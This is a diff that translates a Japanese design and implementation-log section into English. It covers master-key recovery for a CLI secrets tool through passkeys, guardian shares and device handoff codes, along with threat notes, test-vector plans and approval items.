+**Threats and residuals (candidates to copy into the threat-model document)**: (1) collusion between a guardian (one, in any mode) and a hijacker of the owner's account can restore — the guardian is trusted as "that person" (mitigate with all). (2) A hijacker of the owner's account impersonating to a guardian to get approval — voice verification is the boundary (the server can't prove it). (3) If the handoff code's path is actively tampered, the approval goes to a different key — the same "trusted path" discipline as invite links. An approval to a tampered E.pub can be opened by the attacker, but the attacker also needs the ward's account auth as requester (blob fetch and approval fetch both require ward auth). (4) Passkey: a ceremony can be started by any localhost page (the consent prompt is the boundary). (5) Guardian / old-device machines hold shares / B in memory only at the moment of approval (nothing is stored).
 
-#### 19-3. KL2 反復記録の保留項目 (a)〜(d) の裁定
+#### 19-3. Rulings on KL2 iteration log's shelved items (a)–(d)
 
-| 項目 | 巡 | 検討と評価 | 裁定 |
+| Item | Rounds | Consideration and evaluation | Ruling |
 |---|---|---|---|
-| (a) 委任モデル(agent が署名 / HPKE open を代行し鍵素材をソケットに出さない) | 2 | KL3 で agent が新たに担うべき master 鍵操作は 3 つ(保護者分片の open・ハンドオフ用 seal・端末移行の B ラップ)。今ここで委任化すると約 30 + 3 箇所の改修が KL3 の CLI 段に載り、ベータゲートが 1 週伸びる。一方で、台帳の設計は委任と衝突しない(3 操作はいずれも「鍵で 1 回演算する」狭い操作で、ADR-0018 改訂 1 の操作別契約に載る形)。上位互換 = 「KL3 の新規操作を `MasterKeyOps` 相当の狭い関数群経由で書いておく」(費用ほぼゼロ) | **KL3 では採らない。KL4(招待制ベータ後)として ROADMAP に置く**。KL3 の CLI 実装は 3 操作を `apps/cli/src/master-ops.ts`(仮)の関数経由で書き、`MasterKeys` を直に触らない(KL4 でサービス化する下地) |
-| (b) 転送 agent(手元の agent を `ssh -R` で遠隔へ) | 2 | KL3 のハンドオフで「Codespace へ鍵を移す」経路ができ、転送の主目的(遠隔で鍵を使う)は代替される。残る価値は「鍵が手元から出ない」= (a) と不可分。未検証・Web Codespaces で不成立の制約は不変 | **採らない(KL4 で (a) と同時に再評価)**。公開 docs に書かない規律を維持 |
-| (c) agent の TTL / idle timeout | 2 | 前提「再取得が安くなってから」は KL3 で満たされる(パスキー = 生体認証 1 回、ハンドオフ = 旧端末で承認 1 回。いずれもリカバリーコード入力より安い)。ただし再取得はブロブ取得の合算窓(5 回 / 時)を消費するので、TTL は時間単位が実用域。上位互換 = 「master 鍵エントリだけ忘れ、トークンは残す」(再ログイン不要) | **採る(KL3 の CLI 段、K5)**: `maruhi agent --key-ttl <duration>`(既定なし = 従来どおり子の寿命)。期限で master 鍵エントリのみ破棄し、次の鍵操作は「`maruhi key recover --passkey` / `--handoff` で取り直す」案内の型付きエラーになる |
-| (d) gpg-agent 型の自動起動 UX | 1 | KL2 反復記録の評価(無期限常駐・古いソケット・XDG_RUNTIME_DIR 不在)は KL3 で変わらない。KL3 で再取得が安くなるぶん「入れ子シェルを毎回開く」摩擦は相対的に小さくなる | **採らない(据え置き)**。KL4 で (a) と一緒に再評価 |
+| (a) Delegation model (the agent performs signing / HPKE open; key material never crosses the socket) | 2 | The master-key operations the agent would newly take on in KL3 are 3 (opening guardian shares, sealing for handoff, wrapping B for device migration). Delegating now would put ~30 + 3 changes on KL3's CLI stage and stretch the beta gate by a week. On the other hand, the ledger design doesn't collide with delegation (all 3 operations are narrow "one computation with the key" operations that fit ADR-0018 revision 1's per-operation contracts). The superset = "write KL3's new operations via a narrow function group equivalent to `MasterKeyOps`" (cost ~zero) | **Not in KL3. Put on the ROADMAP as KL4 (post invite-beta)**. KL3's CLI implementation writes the 3 operations via functions in `apps/cli/src/master-ops.ts` (provisional) without touching `MasterKeys` directly (the base for service-izing in KL4) |
+| (b) Forwarding agent (forward the local agent to the remote via `ssh -R`) | 2 | KL3's handoff creates a "move the key to a Codespace" path, superseding forwarding's main purpose (using the key remotely). The remaining value — "the key never leaves the local device" — is inseparable from (a). The unverified / doesn't-work-on-Web-Codespaces constraints are unchanged | **Not adopted (re-evaluate with (a) in KL4)**. Keep the don't-write-in-public-docs discipline |
+| (c) Agent TTL / idle timeout | 2 | The premise "once re-fetching is cheap" is met by KL3 (passkey = one biometric, handoff = one approval on the old device; both cheaper than entering a recovery code). However, re-fetching consumes the combined blob-fetch window (5/hour), so practical TTLs are in hours. Superset = "forget only the master-key entry, keep the token" (no re-login needed) | **Adopt (KL3's CLI stage, K5)**: `maruhi agent --key-ttl <duration>` (no default = the child's lifetime as before). On expiry only the master-key entry is discarded, and the next key operation becomes a typed error guiding to "re-fetch with `maruhi key recover --passkey` / `--handoff`" |
+| (d) gpg-agent-style auto-start UX | 1 | The KL2 iteration's evaluation (indefinite residency, stale sockets, no XDG_RUNTIME_DIR) is unchanged by KL3. Since KL3 makes re-fetching cheap, the friction of "opening a nested shell each time" is relatively smaller | **Not adopted (kept as-is)**. Re-evaluate with (a) in KL4 |
 
-#### 19-4. 実装分割と人間レビュー箇所
+#### 19-4. Implementation split and human-review sites
 
-| 段 | 内容 | 概算 | 人間レビュー |
+| Stage | Content | Estimate | Human review |
 |---|---|---|---|
-| K0 スパイク(使い捨て) | WebAuthn PRF の対応表(Chrome / Safari / Firefox × platform / roaming、Windows Hello)、rpId=localhost の成立、VS Code desktop / Web Codespaces / WSL のポート転送下での挙動、Bun での 127.0.0.1 リスナー + ワンタイムトークン。結果を docs/notes/spike-prf.md に | 1 日 | 結果の読み合わせ |
-| K1 仕様 | kl3-spec-drafts.md を正本(CRYPTO_SPEC §8 / §11 / §14.3、AUTH_SPEC §13、AUDIT_SPEC §3.1)へ反映。**この PR のマージ = 所有者承認** | 1 日 | 承認そのもの |
-| K2 crypto + ベクター | `test-vectors/master-key-wrap.json`(19-5)を**先に**コミット → `packages/crypto/src/internal.package/master-wrap.ts`(passkey KEK・master-wrap AAD・XOR 分割 / 結合・guardian-wrap・handoff-wrap・handoff-id・ハンドオフコードの符号化)。`recovery-wrap.json` は不変 | 2〜3 日 | **必須**(packages/crypto) |
-| K3 サーバー | D1 4 表 + マイグレーション、AUTH §13-6〜13-9 のエンドポイント、合算レート制限、監査 9 事件、`@cloudflare/vitest-plugin` テスト | 3〜4 日 | 認可(承認者 ∈ ward のグループ / ward = 自分)、要求 TTL と消費、セッション主体拒否の列挙 |
-| K4 CLI ①(ハンドオフ + 保護者) | `key recover --handoff`、`key approve <code>`、`guardian add / list / remove / wards`、`master-ops.ts`、agent 着地の確認、儀式のゲート | 3 日 | 承認前の本人確認 UX 文言、鍵素材の Redacted 規律 |
-| K5 CLI ②(パスキー + agent TTL) | localhost ページ(CLI 同梱の静的 HTML + 1 スクリプト、CSP `script-src 'self'`)、`key seal passkey`、`key recover --passkey`、`agent --key-ttl` | 2〜3 日 | **ローカル API の認証(ワンタイムトークン + Origin)**— CLI 初の TCP リスナー |
-| K6 docs + 実装録 | `/docs/linux-keychain`(Codespaces = ハンドオフの手順を最上位に)、getting-started の導線、新ページ「Recover your key」(3 経路)、ROADMAP KL 行、本補足に実装録 | 1 日 | — |
+| K0 spike (throwaway) | WebAuthn PRF support table (Chrome / Safari / Firefox × platform / roaming, Windows Hello), whether rpId=localhost works, behavior under VS Code desktop / Web Codespaces / WSL port-forwarding, a 127.0.0.1 listener + one-time token on Bun. Results to docs/notes/spike-prf.md | 1 day | Read the results together |
+| K1 spec | Reflect kl3-spec-drafts.md into the primary documents (CRYPTO_SPEC §8 / §11 / §14.3, AUTH_SPEC §13, AUDIT_SPEC §3.1). **Merging this PR = owner approval** | 1 day | The approval itself |
+| K2 crypto + vectors | Commit `test-vectors/master-key-wrap.json` (19-5) **first** → `packages/crypto/src/internal.package/master-wrap.ts` (passkey KEK, master-wrap AAD, XOR split / combine, guardian-wrap, handoff-wrap, handoff-id, handoff-code encoding). `recovery-wrap.json` unchanged | 2–3 days | **Required** (packages/crypto) |
+| K3 server | D1's 4 tables + migration, AUTH §13-6–13-9's endpoints, combined rate limits, 9 audit events, `@cloudflare/vitest-plugin` tests | 3–4 days | Authorization (approver ∈ ward's group / ward = self), request TTL and consumption, enumeration of session-principal refusals |
+| K4 CLI ① (handoff + guardians) | `key recover --handoff`, `key approve <code>`, `guardian add / list / remove / wards`, `master-ops.ts`, confirm landing in the agent, ceremony gates | 3 days | Pre-approval identity-verification UX wording, the Redacted discipline for key material |
+| K5 CLI ② (passkey + agent TTL) | localhost page (static HTML bundled with the CLI + 1 script, CSP `script-src 'self'`), `key seal passkey`, `key recover --passkey`, `agent --key-ttl` | 2–3 days | **Local-API auth (one-time token + Origin)** — the CLI's first TCP listener |
+| K6 docs + implementation log | `/docs/linux-keychain` (Codespaces = handoff procedure on top), inbound links in getting-started, a new "Recover your key" page (3 paths), the ROADMAP KL row, an implementation log in this supplement | 1 day | — |
 
-順序: K0 → K1 → K2 → K3 → K4 → K5 → K6。**価値順は K4(ハンドオフ)> 保護者 > K5(パスキー)**: ハンドオフだけで Codespaces / 端末移行の摩擦が消え(コード 1 本のコピー)、リカバリーコード入力もサーバー登録も要らない。K5 は K0 の結果次第で並走に外せる(19-6 の承認項目 12)。
+Order: K0 → K1 → K2 → K3 → K4 → K5 → K6. **By value: K4 (handoff) > guardians > K5 (passkey)** — handoff alone removes the Codespaces / device-migration friction (copying one code), needing neither recovery-code entry nor server registration. K5 can be taken off the critical path depending on K0's result (approval item 12 in 19-6).
 
-#### 19-5. テストベクター(K2 で先行コミット)`master-key-wrap.json` の構成案
+#### 19-5. Test vectors (committed ahead in K2) — the `master-key-wrap.json` composition plan
 
-- 正例: `passkey-prf-basic`(prf_out → KEK → AES-GCM。AAD の LP バイト列を併記)/ `guardian-any-2`(KEK・分片 = KEK × 2・固定 HPKE 一時鍵で Seal した分片・info バイト列)/ `guardian-all-3`(乱数 s_1, s_2 と s_3 = KEK ⊕ s_1 ⊕ s_2、3 分片)/ `handoff-guardian-share`(分片を E.pub へ再封印。info に request_id・group_id・share_index・approver)/ `handoff-device`(KEK_h + device 形 AAD の B ラップ + KEK_h の再封印)/ `handoff-id`(E.pub → request_id)/ `handoff-code`(E.pub → Base32 表示形 → 復号)
-- 負例: AAD の kind / wrap_ref / mode 差し替え(`any` ↔ `all` の付け替えを含む)・user_id 移植・guardian-wrap の share_index / guardian_user_id / group_id 移植・handoff-wrap の request_id / approver / source 移植・分片欠落(n−1 片の XOR は復号失敗)・チェックサム不一致のハンドオフコード・suite 不一致・prf_salt 差し替え(別 KEK)
-- README 規約 25 として「recovery-wrap.json は不変(バイト互換)」を明記。生成は既存 tools(`generate-dek-wrap.mjs` の固定一時鍵の作法)を流用
+- Positive cases: `passkey-prf-basic` (prf_out → KEK → AES-GCM. The AAD's LP byte string included) / `guardian-any-2` (KEK, shares = KEK × 2, shares Sealed under fixed HPKE ephemeral keys, the info byte string) / `guardian-all-3` (random s_1, s_2 and s_3 = KEK ⊕ s_1 ⊕ s_2, 3 shares) / `handoff-guardian-share` (re-seal a share to E.pub. info holds request_id, group_id, share_index, approver) / `handoff-device` (KEK_h + B wrap in device-form AAD + re-seal of KEK_h) / `handoff-id` (E.pub → request_id) / `handoff-code` (E.pub → Base32 display form → decode)
+- Negative cases: swapping AAD's kind / wrap_ref / mode (including swapping `any` ↔ `all`), transplanting user_id, transplanting guardian-wrap's share_index / guardian_user_id / group_id, transplanting handoff-wrap's request_id / approver / source, a missing share (XOR of n−1 shares fails to decrypt), a handoff code with a wrong checksum, suite mismatch, swapped prf_salt (a different KEK)
+- Write as README convention 25: "recovery-wrap.json is immutable (byte-compatible)". Generation reuses the existing tools (the fixed-ephemeral-key practice of `generate-dek-wrap.mjs`)
 
-#### 19-6. 所有者に承認を求める項目
+#### 19-6. Items submitted for owner approval
 
-1. 台帳の構造 = クラス S / G / H の 3 型(19-1)。recovery-code は既存のバイト列・表・ベクターのまま(再ラップなし)
-2. ドメイン文字列と LP フィールド列 5 種: `master-wrap`(AAD)/ `passkey-prf`(HKDF info)/ `guardian-wrap`(HPKE info)/ `handoff-wrap`(HPKE info)/ `handoff-id`(SHA-256)— ドラフト §8 の本文
-3. n-of-n の乱数 XOR 分割を仕様に規定すること(mode any / all、n ≤ 5、グループ ≤ 5 / user)
-4. ハンドオフ鍵の運搬 = **人が運ぶコード**(サーバー中継 + 12 語照合を採らない — 裁定 D)
-5. 端末移行 = 一時承認バンドル(台帳に永続行を持たない — 裁定 E / G)
-6. 保護者の鍵の出所 = チェーン導出メンバー + §6.5 充足形。保護者の同意手続きは v1 で持たない(裁定 F)
-7. パスキー PRF の経路 = CLI 配布の localhost ページ(**CLI 初の TCP リスナー**・rpId = `localhost`・登録ごとの乱数 prf_salt)。K0 スパイクを前置(裁定 I)
-8. レート制限とゲート: ブロブ取得は種別合算 1 時間 5 回、ハンドオフ要求 5 回 / 時、承認 20 回 / 時、要求 TTL 15 分、儀式は既存の TTY + 非エージェントゲート、セッション主体は全拒否(裁定 J)
-9. 監査事件 9 種の追加と可視性(ドラフト AUDIT §3.1)
-10. KL2 保留項目の裁定: (a) 委任 = KL4 へ(ベータ後)、(b) 転送 = 採らない、(c) TTL = 採る(K5)、(d) 自動起動 = 採らない(19-3)
-11. 実装分割 K0〜K6 と順序、人間レビュー箇所(19-4)
-12. **ベータゲートの範囲**: 推奨 = ハンドオフ(端末移行)+ 保護者をゲート、パスキー(K5)は K0 の結果次第で並走に外してよい
-13. hosted Web(`apps/web`)は KL3 で触らない(台帳の状態表示は W 系列の後続。ADR-0018 の境界どおり登録・承認は端末限定)
+1. Ledger structure = 3 types: classes S / G / H (19-1). recovery-code keeps the existing byte string, table, and vectors (no re-wrap)
+2. Domain strings and 5 LP field tuples: `master-wrap` (AAD) / `passkey-prf` (HKDF info) / `guardian-wrap` (HPKE info) / `handoff-wrap` (HPKE info) / `handoff-id` (SHA-256) — per draft §8's text
+3. Specifying n-of-n random XOR splitting in the spec (mode any / all, n ≤ 5, groups ≤ 5 / user)
+4. Carrying the handoff key = **a human-carried code** (not server relay + 12-word comparison — ruling D)
+5. Device migration = temporary approval bundle (no persistent ledger row — rulings E / G)
+6. Guardian key source = chain-derived members + §6.5 satisfaction forms. No guardian consent procedure in v1 (ruling F)
+7. Passkey PRF path = a localhost page distributed with the CLI (**the CLI's first TCP listener**, rpId = `localhost`, per-registration random prf_salt). Spike K0 first (ruling I)
+8. Rate limits and gates: blob fetch combined 5/hour, handoff requests 5/hour, approvals 20/hour, request TTL 15 min, ceremonies under the existing TTY + non-agent gate, session principals refused across the board (ruling J)
+9. Adding the 9 audit events and their visibility (draft AUDIT §3.1)
+10. Rulings on KL2's shelved items: (a) delegation → KL4 (post-beta), (b) forwarding → not adopted, (c) TTL → adopted (K5), (d) auto-start → not adopted (19-3)
+11. Implementation split K0–K6 and ordering, human-review sites (19-4)
+12. **Scope of the beta gate**: recommendation = handoff (device migration) + guardians on the gate; passkey (K5) may move off the critical path depending on K0's result
+13. Hosted web (`apps/web`) is untouched by KL3 (ledger state display is a W-series follow-up; per ADR-0018's boundary, registration and approval are device-only)
 
-承認までフェーズ 2(実装)には入らない。
+No phase 2 (implementation) until approval.
 
-#### 19-7. 実装録(フェーズ 2 — 2026-09-12)
+#### 19-7. Implementation log (phase 2 — 2026-09-12)
 
-**K1(仕様反映)**: 承認と同日に 3 正本へ反映(CRYPTO_SPEC 0.9-draft / AUTH_SPEC 0.21-draft / AUDIT_SPEC 1.6-draft)。
+**K1 (spec reflection)**: reflected into the 3 primary documents the same day as approval (CRYPTO_SPEC 0.9-draft / AUTH_SPEC 0.21-draft / AUDIT_SPEC 1.6-draft).
 
-**K2(crypto + ベクター)**: `test-vectors/master-key-wrap.json` を先行コミット(生成 = hpke-js + WebCrypto の `tools/generate-master-key-wrap.mjs`、独立検証 = panva + WebCrypto の `verify_reference.mjs`)。実装は `packages/crypto/src/internal.package/master-wrap.ts`。裁定:
-- **KEK は生 32 バイトで扱う**(`derivePasskeyKek` は deriveBits、`wrapMasterBlob` は毎回 importKey 非抽出): 保護者の XOR 分割が生バイトを要するため、S / G / H で KEK の型を 1 つに揃えた。recovery-code 経路(`recovery.ts` の deriveKey)は不変
-- **ハンドオフコードの表示形** = 58 シンボルを 4 文字ずつハイフン区切り(末尾グループは 2 文字)。復号は小文字・空白・ハイフンを吸収し、アルファベット外・長さ違い・ゼロ詰め非ゼロ・チェックサム不一致は `InvalidInput("handoff code")` で拒否(推測置換しない — recovery-code.ts と同じ規律)
-- **エラー種**: HPKE の失敗は既存の `DekWrapFailed` / `DekUnwrapFailed` を流用(新 kind を足さない)。AES-GCM の `operation` union に `"master-wrap"` を追加(`AeadOperation` として公開。core の Effect ラッパーも追随)
-- **ベクターの負例 `aad-kind-mismatch`** は kind を `device` へ付け替える形にした(`guardian` へ付け替えると mode 空が実装の InvalidInput で先に落ち、AAD 不一致の復号失敗を固定できない)
-- テスト: `test/checks/master-key-wrap.ts`(正例 / 負例 / InvalidInput / ラウンドトリップ)。crypto 1070 チェック・`bun run check` 通過
+**K2 (crypto + vectors)**: `test-vectors/master-key-wrap.json` committed ahead (generation = hpke-js + WebCrypto via `tools/generate-master-key-wrap.mjs`, independent verification = panva + WebCrypto via `verify_reference.mjs`). Implementation is `packages/crypto/src/internal.package/master-wrap.ts`. Rulings:
+- **KEKs are handled as raw 32 bytes** (`derivePasskeyKek` is deriveBits; `wrapMasterBlob` importKeys non-extractable each time): since guardian XOR splitting needs raw bytes, the KEK type was unified to one across S / G / H. The recovery-code path (`recovery.ts`'s deriveKey) is unchanged
+- **The handoff code's display form** = 58 symbols hyphen-separated in groups of 4 (the last group is 2). Decoding absorbs lowercase, spaces, and hyphens; non-alphabet characters, wrong length, nonzero zero-padding, and checksum mismatch are refused with `InvalidInput("handoff code")` (no guessing substitution — same discipline as recovery-code.ts)
+- **Error kinds**: HPKE failures reuse the existing `DekWrapFailed` / `DekUnwrapFailed` (no new kind). Added `"master-wrap"` to the AES-GCM `operation` union (exposed as `AeadOperation`; core's Effect wrapper follows)
+- **The negative vector `aad-kind-mismatch`** was shaped to swap kind to `device` (swapping to `guardian` would hit the implementation's InvalidInput on empty mode first, failing to pin the AAD-mismatch decryption failure)
+- Tests: `test/checks/master-key-wrap.ts` (positive / negative / InvalidInput / round trip). crypto 1070 checks, `bun run check` passes
 
-**K3(サーバー)**: D1 5 表(`master_key_wraps` / `guardian_groups` / `guardian_shares` / `key_handoff_requests` / `key_handoff_approvals`)+ 固定窓 1 表(`key_wrap_windows` — user × kind)。api-schema は独立グループ `keyWraps`(14 エンドポイント)、ハンドラは `apps/server/src/handlers-key-wraps.ts`、リポジトリは `db.package/key-wraps.ts`。裁定:
-- **固定窓は 1 表に一般化**(起草時の `key_blob_fetch_counters` は合算窓専用だった): `consumeWindow` は単一の条件付き UPSERT(`INSERT … ON CONFLICT DO UPDATE … WHERE`)+ `changes() = 1` ガードの監査同梱。`RecoveryRepo.recordFetch` もこれに委譲し(§13-8 の合算)、`recovery_wraps` の行内計数列は書かなくなった(列は据え置き)
-- **監査の 1:1**: 各事件は行の挿入 / 削除と同一 batch(要求・承認・分片取得・ラップ取得)。窓の消費と行の挿入が別文になる要求 / 承認では、監査は**挿入側**にだけ付ける(409 を「要求した」「承認した」として記録しない)。`auth.key_handoff_collected` は要求ごとに初回 1 回(`collected_at` の CAS)
-- **存在秘匿**: ハンドオフの照会・承認・取得は「ward 本人 / ward の保護者」以外・不明・失効を一様 404。役割(device / 自分の分片)は保存行から導出し、payload の申告値で認可しない(`source-mismatch` は 422)
-- **保護者グループの作成は 1 batch**(グループの上限付き INSERT…SELECT → 分片 → 監査 9 事件。監査は `guardedAuditSelectColumns` の INSERT…SELECT で `changes() = 1` 連鎖 + グループ行の存在に条件付け)。当初は監査を 2 段目の batch に分けていたが、PR レビュー(Cursor Bugbot)の指摘どおり 2 段目の失敗で「行あり・監査なし」+ 再試行で別 id の 2 群目ができるため、passkey 登録と同じ同梱形に改めた
-- 成功応答は HttpApi の既定(200 / 204)— 起草の 201 は仕様側を合わせた
-- テスト: `apps/server/test/key-wraps.test.ts`(13 件 — 認可・受理ポリシー・合算窓・存在秘匿・監査の 1:1)。セッション能力マトリクス(`session-capability.test.ts`)と strict 固定テストは新面を機械導出で覆う(パスパラメータ `wrapId` / `groupId` / `requestId` の具現化を追加)
+**K3 (server)**: D1's 5 tables (`master_key_wraps` / `guardian_groups` / `guardian_shares` / `key_handoff_requests` / `key_handoff_approvals`) + 1 fixed-window table (`key_wrap_windows` — user × kind). api-schema is an independent group `keyWraps` (14 endpoints), handlers in `apps/server/src/handlers-key-wraps.ts`, repository in `db.package/key-wraps.ts`. Rulings:
+- **Generalized the fixed window to one table** (the draft's `key_blob_fetch_counters` was combined-window-only): `consumeWindow` is a single conditional UPSERT (`INSERT … ON CONFLICT DO UPDATE … WHERE`) + an audit row bundled with a `changes() = 1` guard. `RecoveryRepo.recordFetch` also delegates to it (§13-8's combining), and `recovery_wraps`' in-row counter column is no longer written (the column stays)
+- **Audit 1:1**: each event lands in the same batch as the row's insert / delete (requests, approvals, share fetches, wrap fetches). For requests / approvals where window consumption and row insertion are separate statements, audit is attached **only to the insert side** (don't record a 409 as "requested" / "approved"). `auth.key_handoff_collected` is recorded once per request on first collection (`collected_at` CAS)
+- **Existence hiding**: handoff lookup / approval / fetch return a uniform 404 for non-"ward self / ward's guardian", unknown, and revoked. The role (device / own share) is derived from the stored row; authorization never trusts the payload's declared value (`source-mismatch` is a 422)
+- **Guardian-group creation is a single batch** (capped group INSERT…SELECT → shares → the 9 audit events. Auditing via `guardedAuditSelectColumns` INSERT…SELECT with `changes() = 1` chaining + conditioned on the group row's existence). Initially audit was split into a second batch, but per the PR review (Cursor Bugbot) point — a second-batch failure produces "rows exist, no audit" + a retry producing a second set with a different id — it was changed to the same bundled form as passkey registration
+- Success responses are HttpApi's default (200 / 204) — the draft's 201 was adjusted to the spec side
+- Tests: `apps/server/test/key-wraps.test.ts` (13 cases — authorization, acceptance policy, combined window, existence hiding, audit 1:1). The session-capability matrix (`session-capability.test.ts`) and strict-pin tests cover the new surface by mechanical derivation (added instantiation of path params `wrapId` / `groupId` / `requestId`)
 
-**K4(CLI — ハンドオフ + 保護者)**: `apps/cli/src/handoff.ts`(`key recover --handoff` の要求者側 / `key approve <code>` の承認者側)、`guardian.ts`(`guardian add / list / remove / wards`)、`master-ops.ts`(master 鍵で 1 回演算する 3 操作 — 分片の開封・B のラップ・要求者鍵への封印。KL4 の委任モデルでサービス化する下地として呼び出し側は `MasterKeys` を直に触らない)。裁定:
-- **コマンド名は `maruhi key approve <code>`**(起草の `key handoff approve` から変更): 承認者は「コードを渡された人」で、旧端末でも保護者でも同じ 1 コマンドにしたい。`key` の下の 3 段目を作らず、`key recover --handoff` と対に置く(ヘルプの `key` 群は generate / show / recover / recovery / approve)
-- **要求者は誰が承認するかを知らない**: `handoffCreate` → `status` で保護者グループの一覧を取り、3 秒間隔で `handoffApprovals` をポーリングして「device 1 件 > any 1 片 > all 全片」の順で組み立てる。承認の HPKE open が失敗したら**中止**(再送要求はしない — 文脈の不一致は改竄か実装バグ)。復元後は要求を DELETE する
-- **承認者の本人確認は yes 1 語**(端末移行: 「自分がいま他端末で出したコードか」/ 保護者: 「帯域外で本人が頼んだと確認したか」— 乗っ取られたアカウントもコードを見せられる旨を明示)。ハンドオフコードは公開鍵なので stderr に出すが、鍵素材(分片・KEK_h・B)は関数ローカルにだけ存在し出力しない
-- **保護者の指名は §6.5 の充足形をそのまま適用**(指紋帳のヒット → yes、無ければ 12 語の最終語再入力)。エージェント環境では儀式そのものを拒否し、フラグ経路(`--expect-fingerprint` 相当)を**設けない**(鍵素材の封印先を非対話で決めさせない)。`--mode` は必須(any / all)
-- **ゲート**: 要求・承認・保護者の指名とも既存の `ensureSensitiveTerminalAllowed`(stdin / stdout / stderr が端末 + 既知エージェント検出 — ADR-0016 決定 7)。要求側は「鍵が既にある端末」も拒否(上書き事故)。指名の端末ゲートは PR レビュー(Cursor Bugbot)の指摘で追加 — 当初はエージェント検出だけで、パイプした stdin で儀式を埋められた
-- **`guardian list --project`** は台帳の保護者 FP をチェーン導出の現鍵と突合し、離脱 / 鍵更新の保護者を STALE + 警告(all では「このグループでは復元できない」と明示)
-- **台帳 id の採番は `@maruhi/core` の `ulid`** へ共有化(サーバーの `ids.ts` は再エクスポート。fallow の重複検出で判明)
-- テスト: `apps/cli/test/handoff.test.ts`(9 件 — 端末移行 / 保護者 any の roundtrip、文脈不一致の中止、既存鍵 / エージェント / 非端末の拒否、承認者の device / 保護者経路、yes 以外・不明要求・不正コード)、`guardian.test.ts`(9 件 — any / all の roundtrip、儀式失敗、前提検査、エージェント拒否、STALE 表示、remove / wards)。`bun run check` 通過(121 ファイル / 2980 件)
+**K4 (CLI — handoff + guardians)**: `apps/cli/src/handoff.ts` (requester side of `key recover --handoff` / approver side of `key approve <code>`), `guardian.ts` (`guardian add / list / remove / wards`), `master-ops.ts` (the 3 operations that compute once with the master key — opening a share, wrapping B, sealing to the requester's key. Callers don't touch `MasterKeys` directly, as the base for service-izing under KL4's delegation model). Rulings:
+- **The command name is `maruhi key approve <code>`** (changed from the draft's `key handoff approve`): the approver is "the person who was handed the code", and we wanted the same single command whether on the old device or a guardian. No third level under `key`; it's paired with `key recover --handoff` (the `key` group in help is generate / show / recover / recovery / approve)
+- **The requester doesn't know who approves**: `handoffCreate` → `status` fetches the guardian-group list, then polls `handoffApprovals` every 3 seconds and assembles in the order "1 device > 1 any-share > all all-shares". If an approval's HPKE open fails, **abort** (don't re-request — a context mismatch is tampering or an implementation bug). After restore the request is DELETEd
+- **Approver identity check is a single "yes"** (device migration: "is this the code you just produced on another device" / guardian: "did you confirm out-of-band that the owner asked" — explicitly notes that a hijacked account can also show a code). The handoff code is a public key, so it's printed to stderr; key material (share, KEK_h, B) exists only function-locally and is never output
+- **Naming a guardian applies §6.5's satisfaction forms as-is** (fingerprint-book hit → yes; otherwise re-enter the 12 words' final word). In agent environments the ceremony itself is refused, and **no** flag path (`--expect-fingerprint` equivalent) is provided (don't let the seal destination of key material be decided non-interactively). `--mode` is required (any / all)
+- **Gates**: request, approval, and guardian naming all use the existing `ensureSensitiveTerminalAllowed` (stdin / stdout / stderr are terminals + known-agent detection — ADR-0016 decision 7). The request side also refuses "a device that already has the key" (overwrite accident). The terminal gate on naming was added on a PR review (Cursor Bugbot) point — initially it had only agent detection, so a piped stdin could fill the ceremony
+- **`guardian list --project`** compares the ledger's guardian FPs against the chain-derived current keys, showing departed / key-updated guardians as STALE + a warning (in all mode it explicitly says "this group cannot restore")
+- **Ledger ids use `@maruhi/core`'s `ulid`** — shared (the server's `ids.ts` re-exports it. Found via fallow's duplicate detection)
+- Tests: `apps/cli/test/handoff.test.ts` (9 cases — device-migration / guardian-any round trips, abort on context mismatch, refusals for existing-key / agent / non-terminal, approver's device / guardian paths, non-yes / unknown-request / invalid-code), `guardian.test.ts` (9 cases — any / all round trips, ceremony failure, precondition checks, agent refusal, STALE display, remove / wards). `bun run check` passes (121 files / 2980 tests)
 
-**K5(部分 — agent TTL)**: `maruhi agent --key-ttl <n><s|m|h>`(19-3 (c))。`apps/cli/src/agent.ts` の保持先を `makeAgentStore` に切り出し、master 鍵エントリ(`master::` 接頭辞)だけを期限で忘れる(トークンは残す = 再ログイン不要。set のたびに期限が延びるので取り直した鍵は新しい期限を持つ。掃除は要求ごと)。ワイヤプロトコルは不変(期限切れは `get` の null / `list` の不在として現れる)。「次の鍵操作は取り直しの案内になる」は `loadMasterKeys` の「鍵なし」文言を全キーチェーン共通で改めて満たした(`maruhi key recover` / `--handoff` / 初回なら `generate` の順 — 旧文言「Generate one」は鍵を持つ人へ新規生成を勧める誤誘導だった)。テストは `agent.test.ts`(偽時計での期限・延長・トークン残存、書式違いの exit 2、案内の stderr)。**passkey PRF(localhost ページ・`key seal passkey` / `key recover --passkey`)は未着手** — K0 スパイクに所有者のハードウェア(認証器 × ブラウザの PRF 対応)が要るため、所有者の K0 実施を待つ。
+**K5 (partial — agent TTL)**: `maruhi agent --key-ttl <n><s|m|h>` (19-3 (c)). The retention side of `apps/cli/src/agent.ts` was extracted into `makeAgentStore`, which forgets only the master-key entries (the `master::` prefix) on expiry (tokens stay = no re-login needed. Each `set` extends the deadline, so a re-fetched key gets a fresh deadline. Cleanup happens per request). The wire protocol is unchanged (expiry surfaces as `get` returning null / absence from `list`). "The next key operation becomes re-fetch guidance" was satisfied by revising `loadMasterKeys`'s "no key" wording across all keychains (`maruhi key recover` / `--handoff` / `generate` if first time — the old wording "Generate one" wrongly steered a key-holder toward generating a new one). Tests are in `agent.test.ts` (expiry / extension / token survival under a fake clock, exit 2 on malformed format, guidance on stderr). **The passkey PRF part (localhost page, `key seal passkey` / `key recover --passkey`) is not started** — the K0 spike needs the owner's hardware (authenticator × browser PRF support), so it waits for the owner to run K0.
 
-**K6(docs — 実装済み経路ぶん)**: 新ページ `/docs/recover-your-key`(3 経路: リカバリーコード / 端末ハンドオフ / 保護者。上限とゲートの明記。passkey は書かない — 未実装)、`/docs/linux-keychain` は Codespaces / dev container の手順をハンドオフ最上位へ書き換え(`maruhi agent -- bash` → `login` → `key recover --handoff` → 手元で `key approve`)+ `--key-ttl` の節、getting-started の step 4 から導線。ROADMAP KL 行を更新。`bun run check` 通過(121 ファイル / 2982 件)。
